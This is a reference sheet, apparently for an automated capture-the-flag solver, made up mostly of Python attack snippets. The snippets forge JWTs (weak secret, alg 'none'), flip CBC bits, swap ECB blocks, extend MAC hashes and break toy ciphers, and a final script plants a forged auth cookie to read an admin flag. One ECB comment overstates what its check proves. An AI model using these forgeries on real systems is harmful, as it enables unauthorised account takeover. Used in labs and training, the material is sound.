# Crypto Weakness Patterns Reference

## Category 1 — Predictable Token (time-based / sequential)

```python
# /tmp/aurelinth/test_token_predict.py
import time, hashlib

# Reproduce source exactly — adjust to match actual token generation
username = "admin"
user_id = 1

# Pattern: token = str(int(time.time()))
for delta in range(-60, 60):
    token = str(int(time.time()) + delta)
    print(f"Candidate: {token}")

# Pattern: token = md5(username + str(user_id))
token = hashlib.md5(f"{username}{user_id}".encode()).hexdigest()
print("MD5 token:", token)

# Pattern: token = random.randint(0, 9999) — brute forceable
for i in range(10000):
    print(i)  # enumerate all
```

## Category 2 — Hardcoded / Weak Secret (JWT)

```python
# /tmp/aurelinth/test_jwt_forge.py
import jwt  # PyJWT

secret = "dev"  # from source
payload = {"user_id": 1, "role": "admin"}
token = jwt.encode(payload, secret, algorithm="HS256")
print("Forged token:", token)
```

## Category 3 — ECB Mode (block cipher)

```python
# /tmp/aurelinth/test_ecb_isolation.py
from Crypto.Cipher import AES

# ECB blocks are independent — identical plaintext → identical ciphertext
# If plaintext: "role=user;name=XX" (16-byte blocks)
# Control name= to align blocks:
# Block 1: "role=user;name=A" → C1
# Block 2: "Aadmin;padding.." → C2 (contains "admin" block encrypted)
# Swap C2 into block 1 position → decrypts to admin role

key = b'a' * 16  # placeholder
cipher = AES.new(key, AES.MODE_ECB)
b1 = cipher.encrypt(b"role=user;name=A")
b2 = cipher.encrypt(b"Aadmin;padding..")
print("Blocks are independent:", b1 != b2)
print("Swap strategy confirmed — server holds key, blocks work regardless")
```

## Category 4 — CBC Bit Flipping

```python
# /tmp/aurelinth/test_cbc_bitflip.py
from Crypto.Cipher import AES
import os

key = os.urandom(16)
iv  = os.urandom(16)

# Encrypt "role=user;flag=0"
plaintext = b"role=user;flag=0"
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(plaintext)

# Flip: "user" → "admi" by XORing IV bytes at positions 5-8
# plaintext[i] XOR iv[i] XOR target_char = desired output
iv_flip = bytearray(iv)
iv_flip[5] ^= ord('u') ^ ord('a')
iv_flip[6] ^= ord('s') ^ ord('d')
iv_flip[7] ^= ord('e') ^ ord('m')
iv_flip[8] ^= ord('r') ^ ord('i')

cipher2 = AES.new(key, AES.MODE_CBC, bytes(iv_flip))
pt_flipped = cipher2.decrypt(ct)
print("Flipped:", pt_flipped)
# Expect: b'role=admi;flag=0'
```

## Category 5 — Padding Oracle

Byte-by-byte decryption via padding oracle (PKCS7):
- Tool: `padoracle` or implement manually
- Requires: app returns different response for bad padding vs bad MAC
- Attack: modify last byte of C1 until padding is valid → XOR reveals plaintext byte

## Category 6 — JWT Algorithm Confusion

```python
# None algorithm
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload}."
print("None-alg token:", token)

# RS256 → HS256 confusion: sign with public key as HMAC secret
# python3 ~/tools/jwt_tool/jwt_tool.py TOKEN -X k -pk public.pem
```

## Category 7 — Hash Length Extension

```bash
# Source: mac = md5(secret + message)
pip install hlextend --break-system-packages -q
python3 -c "
import hlextend
sha = hlextend.new('md5')
new_msg, new_sig = sha.extend(b';admin=1', b'user=attacker', 16, 'ORIGINAL_MAC_HEX')
print('Extended message:', new_msg)
print('New MAC:', new_sig)
"
```

## Category 8 — Custom / Broken Crypto

```python
# XOR with static key
key = b'secret'  # from source
ciphertext = bytes.fromhex("CIPHERTEXT_HEX")
plaintext = bytes(a ^ b for a, b in zip(ciphertext, key * (len(ciphertext) // len(key) + 1)))
print("Decrypted:", plaintext)

# Caesar cipher
ct = "ENCRYPTED"
for shift in range(26):
    pt = ''.join(chr((ord(c) - ord('a') + shift) % 26 + ord('a')) if c.isalpha() else c for c in ct.lower())
    print(f"Shift {shift}: {pt}")
```

---

## Exploit Delivery

```python
# /tmp/aurelinth/exploit_crypto.py
import requests

BASE = "http://LOCAL_TARGET"
s = requests.Session()

s.post(f"{BASE}/register", data={"username":"pwn","password":"pwn"})
r = s.post(f"{BASE}/login", data={"username":"pwn","password":"pwn"})

# Extract original token from response/cookie
token = s.cookies.get("auth_token") or r.json().get("token")
print("Original token:", token)

# Apply forge technique from isolation test
forged_token = token  # replace with actual forged value

s.cookies.set("auth_token", forged_token)
r = s.get(f"{BASE}/admin/flag")
print(r.status_code, r.text[:300])
```

Install libraries if needed: `pip install pycryptodome pyjwt flask-unsign --break-system-packages -q`
